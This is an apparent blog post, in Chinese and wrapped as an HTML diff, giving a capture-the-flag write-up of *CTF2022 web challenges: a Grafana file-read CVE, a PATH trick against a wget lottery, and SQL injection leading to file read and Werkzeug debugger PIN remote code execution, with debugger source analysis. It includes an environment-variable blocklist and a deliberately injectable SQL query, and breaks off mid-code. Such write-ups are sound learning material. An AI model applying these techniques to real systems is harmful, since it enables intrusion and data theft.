@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[*CTF2022]web wp本来都不准备写了的，然后突然又学到了些什么，然后就又开始写了。。。以及windows不能以*作为文件名。。。。 oh-my-grafana百度一下，你就知道.jpg简单题，主页给了版本号，直接百度这个玩意的历史洞，有一个插件目录下任意文件读取的洞CVE-2021-43798，读etc&#x2F;grafana&#x2F;grafana.ini获取到用户名密码，直接登入后台乱点查数据库获">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[*CTF2022]web wp">
+<meta property="og:url" content="https://blog.z3ratu1.cn/%E6%98%9FCTF2022%20web%20wp.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[*CTF2022]web wp本来都不准备写了的，然后突然又学到了些什么，然后就又开始写了。。。以及windows不能以*作为文件名。。。。 oh-my-grafana百度一下，你就知道.jpg简单题，主页给了版本号，直接百度这个玩意的历史洞，有一个插件目录下任意文件读取的洞CVE-2021-43798，读etc&#x2F;grafana&#x2F;grafana.ini获取到用户名密码，直接登入后台乱点查数据库获">
+<meta property="og:locale">
+<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%98%9FCTFwp/image-20220419210508778.png">
+<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%98%9FCTFwp/image-20220419210555322.png">
+<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%98%9FCTFwp/image-20220419212915761.png">
+<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%98%9FCTFwp/image-20220419220911233.png">
+<meta property="article:published_time" content="2022-04-18T13:24:12.000Z">
+<meta property="article:modified_time" content="2022-04-19T14:12:13.203Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.z3ratu1.cn/images/%E6%98%9FCTFwp/image-20220419210508778.png">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/%E6%98%9FCTF2022%20web%20wp.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[*CTF2022]web wp | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/%E6%98%9FCTF2022%20web%20wp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [*CTF2022]web wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-18 21:24:12" itemprop="dateCreated datePublished" datetime="2022-04-18T21:24:12+08:00">2022-04-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-19 22:12:13" itemprop="dateModified" datetime="2022-04-19T22:12:13+08:00">2022-04-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%E6%98%9FCTF2022%20web%20wp.html" class="post-meta-item leancloud_visitors" data-flag-title="[*CTF2022]web wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%E6%98%9FCTF2022%20web%20wp.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%E6%98%9FCTF2022%20web%20wp.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CTF2022-web-wp"><a href="#CTF2022-web-wp" class="headerlink" title="[*CTF2022]web wp"></a>[*CTF2022]web wp</h1><p>本来都不准备写了的，然后突然又学到了些什么，然后就又开始写了。。。<br>以及windows不能以*作为文件名。。。。</p>
+<h2 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h2><p>百度一下，你就知道.jpg<br>简单题，主页给了版本号，直接百度这个玩意的历史洞，有一个插件目录下任意文件读取的洞<code>CVE-2021-43798</code>，读<code>etc/grafana/grafana.ini</code>获取到用户名密码，直接登入后台乱点查数据库获取到flag</p>
+<h2 id="oh-my-lotto-amp-revenge"><a href="#oh-my-lotto-amp-revenge" class="headerlink" title="oh-my-lotto &amp; revenge"></a>oh-my-lotto &amp; revenge</h2><p>允许上传一个文件，然后每次用<code>os.system(&#39;wget --content-disposition -N lotto&#39;)</code>下载一个文件，该文件是不可预测的随机数序列，在普通版本中上传的文件与该文件相同即可获得flag<br>并且可以查看上次的随机数序列</p>
+<p>在os.system之前可以设置一个环境变量，并且有一个简单check</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">safe_check</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'LD'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'HTTP'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'BASH'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'ENV'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'PROXY'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'PS'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token keyword">return</span> <span class="token boolean">True</span>
+</code></pre>
+<p>过滤掉了经典PS ENV等p神文章操作，不能rce，也过滤了PROXY防止经典wget文件外带（也许也能劫持下载文件？）<br>直接修改PATH让系统找不到wget即可，先看一下上一次的随机数序列，传一个相同的文件上去，然后再让目标去下载新的序列，但此时修改PATH随便到什么地方，找不到wget命令无法下载，得到的结果仍为上次结果，即可比对通过</p>
+<p>revenge版本比对一致也不给flag，需要RCE。赛时没做出来</p>
+<h2 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h2><p>本来是不想写这个wp的，但是这个题的赛后讨论让我发现了新的东西，因此存在记录必要</p>
+<p>功能就是一个裸的SQL注入，存在一个flask debug页面，需要通过计算pin在debug界面实现rce</p>
+<p>裸SQL注入直接用sqlmap梭，梭完发现数据库里没东西，os shell udf之类的没有文件权限打不通呜呜。secure_file_priv没设置</p>
+<p>然后上车了。看到有人成功把源码导入了数据库，而我刚好在dump数据库。看到了源码，源码开了个infile&#x3D;1。简单搜索之后发现是经典<code>load data local infile</code>，也就是rouge MySQL读取客户端文件的操作</p>
+<p>目标环境站库分离，mysql机器上不允许文件读取，但web app作为client在连接上去的时候允许了infile，因此可以将本地数据导入数据库。配合SQL注入读出，做到了类似于rouge mysql的任意文件读取。好像是一个新的SQL注入站库分离读文件的思路，但实际上需要连接时允许加载文件。还是有点局限，不过确实需要注意在站库分离的情况下，mysql读文件读的是数据库服务端的文件</p>
+<p>在任意文件读后即可读取文件计算pin码，这里有几个小坑，其中一个坑了我很久。。。一个是pin的计算方法修改为哪两个文件拼一下，而不是原来的三个文件读到哪个是哪个。这个可以通过搜索快速得知，而第二个则是原先的哈希算法由md5变为了sha1，这个得去GitHub翻源码或者提交记录，一开始坑了我好久<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/pallets/werkzeug/commit/11ba286a1b907110a2d36f5c05740f239bc7deed">use SHA-1 instead of MD5</a></p>
+<p>但实际上在计算出了pin以后也坑的要是，在debug页面执行命令会反复爆出当前的错误，而在console路由下执行会反复显示404 not found。。。整的我很无语，最后是有一个队友说他那边能成功执行，所以就出了。。。</p>
+<p>整体题目需要探讨的点不多，主要探讨问题为notepro该题中出现的debug界面无法正常执行命令<br>这个问题有点超出我的认知范围（出题人自己也没搞清楚，得益于WJH@L3H师傅的究极解答）</p>
+<p>先直接给出究极结论，当tl;dr用</p>
+<blockquote>
+<p>werkzeug debug功能要求关闭并发，因为触发错误时候错误的栈帧frame会保存下来，调试指令会带着frame id。如果调试指令和触发错误的请求不是一个worker处理的话会导致找不到frame而失败<br>一个解决方法是keep alive不关闭连接，就会用同一个worker处理。python用requests.session会自动保持连接。<br>调试指令（?__debugger__&#x3D;yes）在失败的时候会回到正常请求处理流程，所以错误页面会继续弹错误页面<br>而&#x2F;console这个带了__debugger__时候进不去，就404了<br>具体代码在werkzeug&#x2F;debug&#x2F;__init__.py<br>DebuggedApplication.__call__</p>
+</blockquote>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://werkzeug.palletsprojects.com/en/2.1.x/debug/">https://werkzeug.palletsprojects.com/en/2.1.x/debug/</a><br>该链接也说明了其debugger在多进程环境下无法工作</p>
+<p>开调</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>找触发点，这里已经告知了在<code>werkzeug/debug/__init__.py</code>下，主要就是看<code>__call__</code>方法，该方法负责处理所有请求</p>
+<pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>
+        self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">,</span> start_response<span class="token punctuation">:</span> <span class="token string">"StartResponse"</span>
+    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Iterable<span class="token punctuation">[</span>bytes<span class="token punctuation">]</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""Dispatch the requests."""</span>
+        <span class="token comment" spellcheck="true"># important: don't ever access a function here that reads the incoming</span>
+        <span class="token comment" spellcheck="true"># form data!  Otherwise the application won't have access to that data</span>
+        <span class="token comment" spellcheck="true"># any more!</span>
+        request <span class="token operator">=</span> Request<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
+        response <span class="token operator">=</span> self<span class="token punctuation">.</span>debug_application
+        <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"__debugger__"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>
+            cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span>
+            arg <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span>
+            secret <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">)</span>
+            frame <span class="token operator">=</span> self<span class="token punctuation">.</span>frames<span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"frm"</span><span class="token punctuation">,</span> type<span class="token operator">=</span>int<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
+            <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">"resource"</span> <span class="token operator">and</span> arg<span class="token punctuation">:</span>
+                response <span class="token operator">=</span> self<span class="token punctuation">.</span>get_resource<span class="token punctuation">(</span>request<span class="token punctuation">,</span> arg<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
+            <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">"pinauth"</span> <span class="token operator">and</span> secret <span class="token operator">==</span> self<span class="token punctuation">.</span>secret<span class="token punctuation">:</span>
+                response <span class="token operator">=</span> self<span class="token punctuation">.</span>pin_auth<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
+            <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">"printpin"</span> <span class="token operator">and</span> secret <span class="token operator">==</span> self<span class="token punctuation">.</span>secret<span class="token punctuation">:</span>
+                response <span class="token operator">=</span> self<span class="token punctuation">.</span>log_pin_request<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
+            <span class="token keyword">elif</span> <span class="token punctuation">(</span>
+                self<span class="token punctuation">.</span>evalex
+                <span class="token operator">and</span> cmd <span class="token keyword">is</span> <span class="token operator">not</span> None
+                <span class="token operator">and</span> frame <span class="token keyword">is</span> <span class="token operator">not</span> None
+                <span class="token operator">and</span> self<span class="token punctuation">.</span>secret <span class="token operator">==</span> secret
+                <span class="token operator">and</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
+            <span class="token punctuation">)</span><span class="token punctuation">:</span>
+                response <span class="token operator">=</span> self<span class="token punctuation">.</span>execute_command<span class="token punctuation">(</span>request<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> frame<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
+        <span class="token keyword">elif</span> <span class="token punctuation">(</span>
+            self<span class="token punctuation">.</span>evalex
+            <span class="token operator">and</span> self<span class="token punctuation">.</span>console_path <span class="token keyword">is</span> <span class="token operator">not</span> None
+            <span class="token operator">and</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> self<span class="token punctuation">.</span>console_path
+        <span class="token punctuation">)</span><span class="token punctuation">:</span>
+            response <span class="token operator">=</span> self<span class="token punctuation">.</span>display_console<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
+        <span class="token keyword">return</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>
+</code></pre>
+<p>可以看到，需要传入一个<code>__debugger__=yes</code>或访问的路径为console路径（默认为&#x2F;console）方可触发debug流程，cmd中的resource选项用于加载debug界面对应的一些前端文件，js，css，png之类的（我跟了一下没有目录穿越呜呜），提交pin进行验证时cmd为pinauth，printpin路由似乎是请求debug页面时自动发出的，为的是在后端直接把pin打印出来方便调试</p>
+<p>cmd不为如上值时尝试执行命令，若仍不满足则使用默认response处理结果，而默认情况下<code>response=self.debug_application</code>，为该函数<br>该函数负责处理全部请求并在产生错误时记录错误数据</p>
+<pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">debug_application</span><span class="token punctuation">(</span>
+        self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">,</span> start_response<span class="token punctuation">:</span> <span class="token string">"StartResponse"</span>
+    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Iterator<span class="token punctuation">[</span>bytes<span class="token punctuation">]</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""Run the application and conserve the traceback frames."""</span>
+        app_iter <span class="token operator">=</span> None
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            app_iter <span class="token operator">=</span> self<span class="token punctuation">.</span>app<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>
+            <span class="token keyword">yield</span> <span class="token keyword">from</span> app_iter
+            <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>app_iter<span class="token punctuation">,</span> <span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                app_iter<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>app_iter<span class="token punctuation">,</span> <span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                app_iter<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
+
+            tb <span class="token operator">=</span> DebugTraceback<span class="token punctuation">(</span>e<span class="token punctuation">,</span> skip<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> hide<span class="token operator">=</span><span class="token operator">not</span> self<span class="token punctuation">.</span>show_hidden_frames<span class="token punctuation">)</span>
+
+            <span class="token keyword">for</span> frame <span class="token keyword">in</span> tb<span class="token punctuation">.</span>all_frames<span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>frames<span class="token punctuation">[</span>id<span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> frame
+
+            is_trusted <span class="token operator">=</span> bool<span class="token punctuation">(</span>self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            html <span class="token operator">=</span> tb<span class="token punctuation">.</span>render_debugger_html<span class="token punctuation">(</span>
+                evalex<span class="token operator">=</span>self<span class="token punctuation">.</span>evalex<span class="token punctuation">,</span>
+                secret<span class="token operator">=</span>self<span class="token punctuation">.</span>secret<span class="token punctuation">,</span>
+                evalex_trusted<span class="token operator">=</span>is_trusted<span class="token punctuation">,</span>
+            <span class="token punctuation">)</span>
+            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">)</span>
+
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                <span class="token keyword">yield</span> <span class="token keyword">from</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>
+            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+                <span class="token comment" spellcheck="true"># if we end up here there has been output but an error</span>
+                <span class="token comment" spellcheck="true"># occurred.  in that situation we can do nothing fancy any</span>
+                <span class="token comment" spellcheck="true"># more, better log something into the error log and fall</span>
+                <span class="token comment" spellcheck="true"># back gracefully.</span>
+                environ<span class="token punctuation">[</span><span class="token string">"wsgi.errors"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>
+                    <span class="token string">"Debugging middleware caught exception in streamed "</span>
+                    <span class="token string">"response at a point where response headers were already "</span>
+                    <span class="token string">"sent.\n"</span>
+                <span class="token punctuation">)</span>
+
+            environ<span class="token punctuation">[</span><span class="token string">"wsgi.errors"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>tb<span class="token punctuation">.</span>render_traceback_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p><code>self.app(environ, start_response)</code>会处理当前请求，若处理中发生了异常，则会将异常对应的frame进行记录并写入self.frames</p>
+<p>在用户请求触发错误的页面时，在该题中如<code>note_id=1</code>，会因为没有传入debugger&#x3D;&#x3D;yes直接进入到debug_application函数中，在<code>self.app(environ, start_response)</code>完成请求的处理，而该请求本身会触发报错，因此会将报错的frame写入对应的frame中。接着我们在debug页面的console传入cmd，就能满足</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">elif</span> <span class="token punctuation">(</span>
+    self<span class="token punctuation">.</span>evalex
+    <span class="token operator">and</span> cmd <span class="token keyword">is</span> <span class="token operator">not</span> None
+    <span class="token operator">and</span> frame <span class="token keyword">is</span> <span class="token operator">not</span> None
+    <span class="token operator">and</span> self<span class="token punctuation">.</span>secret <span class="token operator">==</span> secret
+    <span class="token operator">and</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
+<span class="token punctuation">)</span><span class="token punctuation">:</span>
+</code></pre>
+<p>这里的secret感觉像是个nonce一类的东西，是前端上的一个值，check_pin_trust就是验证pin是不是正确的</p>
+<p>理论上就能进入到命令执行，而实际上我们打的时候会在debug页面再次出发一次报错，输出一轮和debug页面一样的东西，整的大家都很无语</p>
+<p>调试结果如下，访问错误路径诱发报错后</p>
+<p><img src="/images/%E6%98%9FCTFwp/image-20220419210508778.png" alt="image-20220419210508778"></p>
+<p>而当我们开始执行命令时却变成了这样</p>
+<p><img src="/images/%E6%98%9FCTFwp/image-20220419210555322.png" alt="image-20220419210555322"></p>
+<p>此时frame为空使得判断跳出，再次进入debug_application函数，又进行处理并抛出异常，也就是我们见到的执行命令套娃抛出异常</p>
+<p>（说起来这里我其实是没法区分它们是不是多个不同进程的，因为地址怎么是一样的呢。。。）但是多进程确实是最合理的解释，因为也没有别的地方有相关读写代码了，之前写了后续没有别的写却变成了空，多进程是最合理的解释。</p>
+<p>这里还有一个很愚蠢的问题，既然我的请求已经变成了一个debug的请求，那么为什么debug请求处理得到的报错还是和SQL注入的报错一样呢？是因为请求debug页面的请求是<code>/view?__debugger__=yes....</code>，还是请求在view路由下，而后面一大堆的buff因为frame为空都没用了，还是走view的路由，然后因为没有提供id得到的是查不到结果的TypeError，如果当note_id为空时进行额外处理，就会得到一个截然不同的结果</p>
+<p>简单的魔改代码</p>
+<pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">)</span>
+@login_required
+<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    note_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"note_id"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> note_id <span class="token keyword">is</span> None<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"id is None"</span>
+    sql <span class="token operator">=</span> f<span class="token string">"select * from notes where note_id='{note_id}'"</span> 
